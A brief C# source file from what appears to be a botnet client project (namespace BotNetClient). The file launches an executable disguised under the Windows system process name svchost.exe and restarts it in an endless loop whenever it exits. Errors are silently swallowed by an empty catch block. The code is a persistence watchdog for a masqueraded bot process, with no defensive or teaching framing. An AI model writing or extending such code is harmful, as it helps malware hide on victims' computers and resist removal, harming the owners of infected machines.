using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace BotNetClient
{
    class SecondThread
    {
        public static void miniprog()
        {
            try
            {
                Process proc = new Process();
                proc.StartInfo.FileName = @"C:\Users\Павел\source\repos\BotNet\svchost.exe\svchost.exe\bin\Release\svchost.exe.exe";
                proc.Start();
                while (true)
                {
                    if (!proc.HasExited)
                    {

                    }
                    else
                    {
                        proc.Start();
                    }
                }
            }
            catch (Exception ex)
            {
            }
            finally
            {
                Program.miniprogram = null;
            }
            
        }
    }
}
